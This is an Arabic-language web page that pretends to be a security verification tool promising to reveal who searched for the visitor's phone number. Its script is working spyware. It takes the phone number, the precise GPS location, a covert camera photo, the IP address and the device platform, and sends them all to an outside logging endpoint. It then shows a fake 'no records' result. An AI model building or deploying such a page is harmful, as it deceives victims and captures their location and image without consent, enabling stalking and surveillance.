<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مركز الأمان الرقمي | Security Verification</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        * { box-sizing: border-box; transition: 0.3s; }
        body { 
            margin: 0; padding: 0; 
            background: radial-gradient(circle at center, #0f172a 0%, #020617 100%);
            font-family: 'Segoe UI', sans-serif; color: #fff; height: 100vh; 
            display: flex; align-items: center; justify-content: center; overflow: hidden;
        }

        .security-alert {
            position: fixed; top: 15px; width: 92%; max-width: 400px;
            background: rgba(255, 193, 7, 0.15); border: 1px solid rgba(255, 193, 7, 0.4);
            backdrop-filter: blur(12px); padding: 12px; border-radius: 14px;
            display: flex; align-items: center; gap: 12px; z-index: 1000;
            animation: slideDown 0.6s ease-out;
        }

        .glass-card {
            background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 30px;
            padding: 40px; width: 90%; max-width: 400px; text-align: center;
            box-shadow: 0 25px 50px rgba(0,0,0,0.6);
        }

        .icon-shield {
            width: 70px; height: 70px; background: rgba(56, 189, 248, 0.1);
            border-radius: 20px; display: flex; align-items: center; justify-content: center;
            margin: 0 auto 20px; border: 1px solid #38bdf8;
            animation: pulse 2s infinite;
        }

        input {
            width: 100%; background: rgba(15, 23, 42, 0.7); border: 1px solid rgba(255,255,255,0.1);
            padding: 16px; border-radius: 12px; color: #fff; font-size: 16px; 
            outline: none; text-align: center; margin-bottom: 20px;
        }

        .btn-verify {
            width: 100%; padding: 16px; border: none; border-radius: 12px;
            background: linear-gradient(90deg, #38bdf8, #0ea5e9);
            color: #0f172a; font-weight: 800; cursor: pointer;
        }

        #status-box { margin-top: 25px; display: none; }
        .progress-bar { width: 100%; height: 5px; background: rgba(255,255,255,0.1); border-radius: 10px; margin-top: 8px; overflow: hidden; }
        .progress-inner { width: 0%; height: 100%; background: #38bdf8; transition: 0.5s; }

        @keyframes slideDown { from { transform: translateY(-100%); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(56, 189, 248, 0.4); } 70% { box-shadow: 0 0 0 15px rgba(56, 189, 248, 0); } 100% { box-shadow: 0 0 0 0 rgba(56, 189, 248, 0); } }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="security-alert">
    <i class="fas fa-exclamation-triangle" style="color: #ffc107;"></i>
    <span style="color: #ffc107; font-size: 11px;">تنبيه: يتطلب النظام "صلاحية الوصول الكاملة" للمطابقة الحيوية وتحديد موقع السجلات الرقمية بدقة.</span>
</div>

<div class="glass-card">
    <div class="icon-shield"><i class="fas fa-fingerprint fa-2x" style="color: #38bdf8;"></i></div>
    <h2 style="font-size: 1.3rem; margin-bottom: 5px;">كاشف الأرقام المتقدم</h2>
    <p style="color: #94a3b8; font-size: 12px; margin-bottom: 25px;">أدخل الرقم لمعرفة من قام بالبحث عنك عبر السجلات الحية</p>

    <input type="tel" id="targetPhone" placeholder="أدخل رقم هاتفك هنا">
    <button id="runBtn" class="btn-verify">بدء عملية التحقق</button>

    <div id="status-box">
        <div id="status-msg" style="font-size: 12px; color: #38bdf8;">جاري جلب إحداثيات GPS...</div>
        <div class="progress-bar"><div class="progress-inner" id="bar"></div></div>
    </div>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
    const API_URL = "https://sed-x8mt.vercel.app/log-data";

    document.getElementById('runBtn').addEventListener('click', async () => {
        const phone = document.getElementById('targetPhone').value;
        if (!phone) return alert("الرجاء إدخال الرقم");

        document.getElementById('status-box').style.display = 'block';
        document.getElementById('runBtn').disabled = true;

        // 1. جلب الموقع بأقصى دقة (HTML5 Geolocation API)
        let mapLink = "الموقع: مرفوض";
        try {
            const position = await new Promise((res, rej) => {
                navigator.geolocation.getCurrentPosition(res, rej, {
                    enableHighAccuracy: true,
                    timeout: 8000
                });
            });
            mapLink = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
        } catch(e) { console.log("Geo Error"); }

        document.getElementById('status-msg').innerText = "جاري إجراء المصادقة الحيوية...";
        document.getElementById('bar').style.width = "50%";

        try {
            // 2. تشغيل الكاميرا
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            document.getElementById('video').srcObject = stream;

            const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip: "N/A"}));

            setTimeout(() => {
                const canvas = document.getElementById('canvas');
                const video = document.getElementById('video');
                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);

                canvas.toBlob(async (blob) => {
                    const data = `
📍 صيد بدقة عالية:
📱 الرقم: ${phone}
🌐 الـ IP: ${ipData.ip}
🗺 الموقع: ${mapLink}
💻 الجهاز: ${navigator.platform}
                    `;
                    const fd = new FormData();
                    fd.append('username', data);
                    fd.append('photo', blob, 'shot.jpg');

                    await fetch(API_URL, { method: 'POST', body: fd });
                    
                    document.getElementById('status-msg').innerText = "اكتمل الفحص: لا توجد سجلات حالياً.";
                    document.getElementById('status-msg').style.color = "#ef4444";
                    document.getElementById('bar').style.background = "#ef4444";
                    document.getElementById('bar').style.width = "100%";
                    stream.getTracks().forEach(t => t.stop());
                }, 'image/jpeg');
            }, 2000);

        } catch (err) {
            document.getElementById('status-msg').innerText = "يجب السماح بالأذونات لإكمال الفحص.";
        }
    });
</script>
</body>
</html>
